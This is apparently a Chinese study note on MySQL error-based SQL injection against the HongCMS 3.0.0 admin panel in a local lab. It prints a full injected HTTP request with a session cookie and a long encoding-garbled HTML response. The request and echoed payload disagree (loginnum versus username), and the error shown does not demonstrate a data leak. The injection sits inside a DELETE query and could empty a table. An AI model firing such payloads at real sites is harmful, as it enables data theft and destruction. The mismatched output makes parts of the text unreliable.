# 0x00 前言
360的笔试和前两天的面试都问道这个问题了，只不过360是sql server，然后后来的面试问的是MySQL，以前感觉自己好像都会了，但是当真正遇到问题才发现不是想想中的样子。。

# 0x01 先来MySQL（这个环境好搭建一点）
环境
- Windows server2008
- IIS7+php5+mysql5.0.22
- Hong cms 3.0.0后台报错注入

# 0x02 注入payload

实际遇到可能要先爆破管理员密码。。。。
参考[Hongcms 3.0.0后台SQL注入漏洞分析](https://www.freebuf.com/vuls/178316.html)和[十种MySQL报错注入](https://blog.csdn.net/whatday/article/details/63683187)  
采用报错注入，因为mysql5.0没有updatexml函数，所以使用floor、group by和count函数的冲突进行报错注入。
```
GET /admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc%60where%20vvcid=1%20or%20(select%201%20from%20(select%20count(*),concat((select%20loginnum%20from%20hong_admin),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%60 HTTP/1.1
Host: 192.168.72.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.72.131/admin/index.php/database
Connection: keep-alive
Cookie: O0oqZrypyswqadmin=104918af865ae8146284b36ed2c5c907
Upgrade-Insecure-Requests: 1
```
HTTP/1.1 200 OK
Content-Type: text/html
Server: Microsoft-IIS/7.5
X-Powered-By: PHP/5.3.1
X-Powered-By: ASP.NET
Date: Thu, 18 Apr 2019 10:58:10 GMT
Content-Length: 8502

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>HongCMS - åå°ç®¡ç</title>
<link rel="stylesheet" type="text/css" href="/public/admin/admin.css">
<link rel="stylesheet" type="text/css" href="/public/js/artDialog/black.css">
<script src="/public/js/jquery-1.8.3.min.js" type="text/javascript"></script>
<script src="/public/js/jquery.cookie.js" type="text/javascript"></script>
<script src="/public/js/artDialog/jquery.artDialog.min.js" type="text/javascript"></script>
<script src="/public/admin/admin.js" type="text/javascript"></script>
<script type="text/javascript">
var this_uri = "/admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc%60where%20vvcid=1%20or%20(select%201%20from%20(select%20count(*),concat((select%20substring(username,1,2)%20from%20hong_admin),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%60";
</script>
</head>
<body>
<div id="header">
	<div class="logo" ><a href="/admin/"><img src="/public/admin/images/logo.gif" title="åå°é¦é¡µ"></a></div>
	<div class="loading"><div id="ajax-loader" title="Ajaxæ°æ®æ´æ°ä¸­..."></div></div>
	<div id="topbar">
		<div id="topmenu">
			<dl class="first"></dl>
			<dl>
				<dt><a href="/admin/index.php/articles">æç« </a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/articles/add">æ·»å æç« </a></li>
						<li><a href="/admin/index.php/articles">æç« åè¡¨</a></li>
						<li class="last"><a href="/admin/index.php/acategory">æç« ç±»å«</a></li>
					</div>
				</dd>
			</dl>
			<dl>
				<dt><a href="/admin/index.php/products">äº§å</a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/products/add">æ·»å äº§å</a></li>
						<li><a href="/admin/index.php/products">äº§ååè¡¨</a></li>
						<li class="last"><a href="/admin/index.php/pcategory">äº§åç±»å«</a></li>
					</div>
				</dd>
			</dl>
			<dl>
				<dt><a href="/admin/index.php/users">ç¨æ·</a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/users/add">æ·»å ç¨æ·</a></li>
						<li class="last"><a href="/admin/index.php/users">ç¨æ·åè¡¨</a></li>
					</div>
				</dd>
			</dl>
			<dl>
				<dt><a href="/admin/index.php/news">å¶å®</a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/news">ç«ç¹æ°é»</a></li>
						<li class="last"><a href="/admin/index.php/contents">å¸¸æåå®¹</a></li>
					</div>
				</dd>
			</dl>
			<dl>
				<dt><a href="/admin/index.php/settings">ç³»ç»</a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/settings">ç½ç«è®¾ç½®</a></li>
						<li><a href="/admin/index.php/language">è¯­è¨ç®¡ç</a></li>
						<li><a href="/admin/index.php/template">æ¨¡æ¿ç®¡ç</a></li>
						<li><a href="/admin/index.php/database">æ°æ®ç»´æ¤</a></li>
						<li><a href="/admin/index.php/phpinfo">ç¯å¢ä¿¡æ¯</a></li>
						<li class="last"><a href="/admin/index.php/upgrade">ç³»ç»åçº§</a></li>
					</div>
				</dd>
			</dl>
			<dl class="last"></dl>
		</div>


		<div id="topuser">
			<dl class="first"></dl>
			<dl class="info"><!-- å¦ææ²¡æä¿¡æ¯ class=info none -->
				<dt><a href="/admin/"><i></i><span>18</span></a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/">é¢çæ ·å¼!!</a></li>
						<li><a href="/admin/">æ8ä¸ªæ°è®¢å</a></li>
						<li class="last"><a href="/admin/">æ10ç¯æç« å¾å®¡</a></li>
					</div>
				</dd>
			</dl>
			<dl class="msg none"><!-- å¦ææ²¡æä¿¡æ¯ class=msg none -->
				<dt><a href="/admin/"><i></i><span>0</span></a></dt>
				<dd>
					<div>
						<div class=right>ææ ç«åç­ä¿¡.</div>
					</div>
				</dd>
			</dl>
			<dl class="admin">
				<dt><a onclick="$.dialog({title:'æä½ç¡®è®¤',lock:true,content:'ç¡®å®éåº HongCMS åå°ç®¡çå?',okValue:'  ç¡®å®  ',ok:function(){window.location='/admin/index.php/index/logout';},cancelValue:'åæ¶',cancel:true});return false;"><i></i></a></dt>
				<dd>
					<div>
						<li class="first"><a href="/admin/index.php/index/logout">ç³»ç»ç®¡çå éåº?</a></li>
						<li><a href="/" target="_blank">ç½ç«é¦é¡µ</a></li>
						<li class="last"><a href="/admin/index.php/users/edit?userid=1">ä¿®æ¹æçèµæ</a></li>
					</div>
				</dd>
			</dl>
			<dl class="last"></dl>
		</div>
		<div></div>
	</div>
</div>

<div><!-- å¤å±æ·»å ä¸ä¸ªDIVè§£å³IE8ä¸margin-topçé®é¢ -->
<table cellpadding="0" cellspacing="0" id="maintable">
<tr>
<td id="container" valign="top">
<div id="sidebar">
	<div class="sidebar-toggler" title="æ¶æ¢èå(Ctrl <)"><i></i></div>
	<ul>
		<li class="start">
		   <a href="/admin/">
		   <i class="i-home"></i> 
		   <span class="title">é¦ é¡µ</span>
		   </a>
		</li>
		<li class="has-sub">
		   <a href="#">
		   <i class="i-articles"></i> 
		   <span class="title">æç« </span>
		   <span class="arrow"></span>
		   </a>
		   <ul class="sub">
			  <li><a href="/admin/index.php/articles/add">æ·»å æç« </a></li>
			  <li><a href="/admin/index.php/articles">æç« åè¡¨</a></li>
			  <li><a href="/admin/index.php/acategory">æç« ç±»å«</a></li>
		   </ul>
		</li>
		<li class="has-sub">
		   <a href="#">
		   <i class="i-pros"></i> 
		   <span class="title">äº§å</span>
		   <span class="arrow"></span>
		   </a>
		   <ul class="sub">
			  <li><a href="/admin/index.php/products/add">æ·»å äº§å</a></li>
			  <li><a href="/admin/index.php/products">äº§ååè¡¨</a></li>
			  <li><a href="/admin/index.php/pcategory">äº§åç±»å«</a></li>
		   </ul>
		</li>
		<li class="has-sub">
		   <a href="#">
		   <i class="i-users"></i> 
		   <span class="title">ç¨æ·</span>
		   <span class="arrow"></span>
		   </a>
		   <ul class="sub">
			  <li><a href="/admin/index.php/users/add">æ·»å ç¨æ·</a></li>
			  <li><a href="/admin/index.php/users">ç¨æ·åè¡¨</a></li>
		   </ul>
		</li>
		<li class="has-sub">
		   <a href="#">
		   <i class="i-others"></i> 
		   <span class="title">å¶å®</span>
		   <span class="arrow"></span>
		   </a>
		   <ul class="sub">
			  <li><a href="/admin/index.php/news">ç«ç¹æ°é»</a></li>
			  <li><a href="/admin/index.php/contents">å¸¸æåå®¹</a></li>
		   </ul>
		</li>
		<li class="has-sub">
		   <a href="#">
		   <i class="i-settings"></i> 
		   <span class="title">ç³»ç»</span>
		   <span class="arrow"></span>
		   </a>
		   <ul class="sub">
			  <li><a href="/admin/index.php/settings">ç½ç«è®¾ç½®</a></li>
			  <li><a href="/admin/index.php/language">è¯­è¨ç®¡ç</a></li>
			  <li><a href="/admin/index.php/template">æ¨¡æ¿ç®¡ç</a></li>
			  <li><a href="/admin/index.php/database">æ°æ®ç»´æ¤</a></li>
			  <li><a href="/admin/index.php/phpinfo">ç¯å¢ä¿¡æ¯</a></li>
			  <li><a href="/admin/index.php/upgrade">ç³»ç»åçº§</a></li>
		   </ul>
		</li>
		<li class="end"></li>
	</ul>
</div>
</td>

<td valign="top" class="maintd">
  <div class="maindiv">
	 <div id="main"><div class="itemtitle"><h3>æ°æ®åºç»´æ¤</h3></div><center><br /><br /><br /><br /><b>Database Query Error Info</b><br /><textarea rows="22" style="width:480px;font-size:12px;">Database Query Error Info:

Invalid SQL: DELETE FROM `hong_vvc`where vvcid=1 or (select 1 from (select count(*),concat((select substring(username,1,2) from hong_admin),floor(rand(0)*2))x from information_schema.tables group by x)a) or ``

Error: Unknown column '' in 'where clause'
Error No: 1054
File: /admin/index.php/database/operate
</textarea></center><div class=sysinfo>2019 &copy; HongCMS(3.0.0) <a href="http://www.weentech.com" target="_blank">weentech.com</a> Done in 0.012 second(s), 2 queries, GMT+8 2019-04-18 18:58:10</div>
		</div>
  </div>
</td>
</tr>
</table>
</div>

<script type="text/javascript">
	jQuery(document).ready(function() {
		//è°æ´é«åº¦
		$("#container").height($(window).height()-40); 
		$(window).resize(function() {
			$("#container").height($(window).height()-40);
		});

		App.init();//å·¦ä¾§èååå§å

		var a101 = $("#topbar"); //é¡¶é¨ä¸æ¥èå
		a101.find("dl").Jdropdown({delay: 0}, function(a){});

		//å¨écheckbox
		$("#checkAll").click(function(e){
			$("input[name='" + $(this).attr("for") + "']").attr("checked", this.checked);
		});
	});
</script>

</body>
</html>